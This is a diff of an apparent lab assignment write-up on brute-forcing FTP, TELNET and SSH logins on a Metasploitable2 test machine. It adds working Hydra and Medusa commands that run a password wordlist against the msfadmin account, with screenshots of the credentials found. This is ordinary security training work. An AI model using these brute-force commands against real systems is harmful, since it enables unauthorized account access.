@@ -3,7 +3,7 @@
 **Time Allocated:** 3 Hours  
 **Total Marks:** 15  
 **Protocols:** FTP, TELNET, SSH, HTTP  
-**Tools Used:** Hydra, Burp Suite, Wireshark, tcpdump, Medusa, NetExec
+**Tools Used:** Hydra, Burp Suite, Wireshark
 
 ---
 
@@ -57,15 +57,45 @@ This username is commonly found on Metasploitable2 and was confirmed through SMB
 
 ### 2.1 FTP, TELNET, SSH
 
+- **FTP Brute Force**
+
 **Tool Used:** `Hydra`  
 **Password List:** `password.txt`
 
 **Commands:**
 
-- **FTP Brute Force**
 ```bash
 hydra -l msfadmin -P /usr/share/wordlists/password.txt ftp://192.168.43.137
 ```
  **Valid Credentials Found:**
-![image](https://github.com/user-attachments/assets/411949ea-00e7-4afa-afa9-306550ba8580)
+ 
+![image](https://github.com/user-attachments/assets/67c69495-67fd-43a3-ab64-b01b7925da10)
 
+- **TELNET Brute Force**
+
+**Tool Used:** `Hydra`  
+**Username:** `msfadmin`  
+**Password List:** `password.txt`
+
+**Commands:**
+
+```bash
+hydra -l msfadmin -P /usr/share/wordlists/password.txt telnet://192.168.43.137
+```
+ **Valid Credentials Found:**
+ ![image](https://github.com/user-attachments/assets/66a3a2bb-a32f-4800-a680-4827bd10f93a)
+
+- **SSH Brute Force**
+
+**Tool Used:** `medusa`  
+**Username:** `msfadmin`  
+**Password List:** `password.txt`
+
+**Commands:**
+
+```bash
+medusa -h 192.168.43.137 -u msfadmin -P /usr/share/wordlists/password.txt -M ssh
+```
+ **Valid Credentials Found:**
+ 
+ ![image](https://github.com/user-attachments/assets/b1f433be-8c77-45f9-bc40-05d92186c266)
